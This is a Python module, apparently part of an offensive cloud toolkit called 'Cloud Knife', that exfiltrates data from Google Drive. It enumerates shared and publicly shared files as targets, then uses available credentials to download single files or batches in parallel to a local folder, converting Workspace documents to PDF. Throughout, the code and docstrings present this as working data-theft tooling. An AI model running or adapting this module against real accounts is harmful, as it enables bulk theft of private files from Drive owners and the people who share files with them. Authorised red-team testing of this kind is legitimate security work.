"""
GCP Google Drive Exfiltration for Cloud Knife.

Downloads files from Google Drive for data exfiltration.
Supports:
- Single file download
- Batch file download (parallel)
- Enumeration of shared files for exfiltration targeting
"""

from typing import List, Dict, Any, TYPE_CHECKING
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import io

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

if TYPE_CHECKING:
    from src.clouds.gcp.gcp_session import GCPSessionManager

console = Console()


def enumerate_shared_files(
    session_mgr: "GCPSessionManager",
    publicly_shared: bool = False,
) -> List[Dict[str, Any]]:
    """
    Enumerate files shared with others or publicly.

    Identifies files that can be exfiltrated based on sharing permissions.

    Args:
        session_mgr: GCP session manager
        publicly_shared: Show only publicly accessible files

    Returns:
        List of shared files available for exfiltration
    """
    from src.clouds.gcp.modules.enumeration.google_drive import enumerate_drive_files

    if publicly_shared:
        console.print("[bold yellow]Listing publicly shared files (SECURITY RISK!)...[/bold yellow]")
        query = "visibility = 'anyoneWithLink' or visibility = 'anyoneCanFind'"
    else:
        console.print("[bold]Listing shared files...[/bold]")
        query = "sharedWithMe = true or visibility != 'limited'"

    return enumerate_drive_files(session_mgr, query=query, show_shared=True, show_permissions=True)


def download_file(
    session_mgr: "GCPSessionManager",
    file_id: str,
    output_path: str,
    file_name: str = None,
) -> bool:
    """
    Download a single file from Google Drive.

    Args:
        session_mgr: GCP session manager with valid credentials
        file_id: Google Drive file ID
        output_path: Directory where to save the file
        file_name: Optional custom filename (otherwise uses Drive filename)

    Returns:
        True if download succeeded, False otherwise
    """
    from googleapiclient.discovery import build
    from googleapiclient.errors import HttpError
    from googleapiclient.http import MediaIoBaseDownload

    drive_scopes = [
        "https://www.googleapis.com/auth/drive.readonly",
        "https://www.googleapis.com/auth/drive.metadata.readonly",
    ]
    credentials = session_mgr.get_credentials(scopes=drive_scopes)
    if not credentials:
        console.print("[red]No credentials configured.[/red]")
        return False

    try:
        service = build('drive', 'v3', credentials=credentials)

        file_metadata = service.files().get(
            fileId=file_id,
            fields="name, mimeType",
            supportsAllDrives=True,
        ).execute()

        if not file_name:
            file_name = file_metadata.get('name', f'file_{file_id}')

        mime_type = file_metadata.get('mimeType', '')

        output_dir = Path(output_path).expanduser().resolve()
        output_dir.mkdir(parents=True, exist_ok=True)

        file_path = output_dir / file_name

        if mime_type.startswith('application/vnd.google-apps'):
            console.print(f"[yellow]Google Workspace file detected: {mime_type}[/yellow]")
            console.print(f"[dim]Exporting as PDF...[/dim]")

            request = service.files().export_media(
                fileId=file_id,
                mimeType='application/pdf'
            )
            file_path = file_path.with_suffix('.pdf')
        else:
            request = service.files().get_media(
                fileId=file_id,
                supportsAllDrives=True,
            )

        fh = io.FileIO(str(file_path), 'wb')
        downloader = MediaIoBaseDownload(fh, request)

        done = False
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console
        ) as progress:
            task = progress.add_task(f"Downloading {file_name}...", total=100)

            while not done:
                status, done = downloader.next_chunk()
                if status:
                    progress.update(task, completed=int(status.progress() * 100))

        console.print(f"[green]✓ Downloaded: {file_path}[/green]")
        return True

    except HttpError as error:
        console.print(f"[red]API error downloading {file_name}: {error}[/red]")
        return False
    except Exception as e:
        console.print(f"[red]Error downloading {file_name}: {str(e)}[/red]")
        return False


def download_files_batch(
    session_mgr: "GCPSessionManager",
    files: List[Dict[str, Any]],
    output_dir: str = "./drive_downloads",
    max_workers: int = 5,
) -> Dict[str, Any]:
    """
    Download multiple files from Google Drive in parallel.

    Args:
        session_mgr: GCP session manager with valid credentials
        files: List of file dictionaries (from enumerate_drive_files)
        output_dir: Directory where to save files
        max_workers: Number of parallel downloads (default 5)

    Returns:
        Dictionary with download statistics
    """
    if not files:
        console.print("[yellow]No files to download.[/yellow]")
        return {"success": 0, "failed": 0, "total": 0}

    console.print(f"\n[bold]Downloading {len(files)} file(s) to: {output_dir}[/bold]")

    output_path = Path(output_dir).expanduser().resolve()
    output_path.mkdir(parents=True, exist_ok=True)

    success_count = 0
    failed_count = 0
    failed_files = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_file = {
            executor.submit(
                download_file,
                session_mgr,
                file['id'],
                output_dir,
                file['name']
            ): file
            for file in files
        }

        for future in as_completed(future_to_file):
            file = future_to_file[future]
            try:
                result = future.result()
                if result:
                    success_count += 1
                else:
                    failed_count += 1
                    failed_files.append(file['name'])
            except Exception as e:
                console.print(f"[red]Error downloading {file['name']}: {str(e)}[/red]")
                failed_count += 1
                failed_files.append(file['name'])

    console.print(f"\n[bold green]Download complete![/bold green]")
    console.print(f"[green]✓ Success: {success_count}[/green]")
    if failed_count > 0:
        console.print(f"[red]✗ Failed: {failed_count}[/red]")
        if failed_files:
            console.print("[dim]Failed files:[/dim]")
            for name in failed_files[:10]:
                console.print(f"  [dim]• {name}[/dim]")
            if len(failed_files) > 10:
                console.print(f"  [dim]... and {len(failed_files) - 10} more[/dim]")

    console.print(f"[cyan]Files saved to: {output_path}[/cyan]")

    return {
        "success": success_count,
        "failed": failed_count,
        "total": len(files),
        "output_dir": str(output_path),
        "failed_files": failed_files,
    }
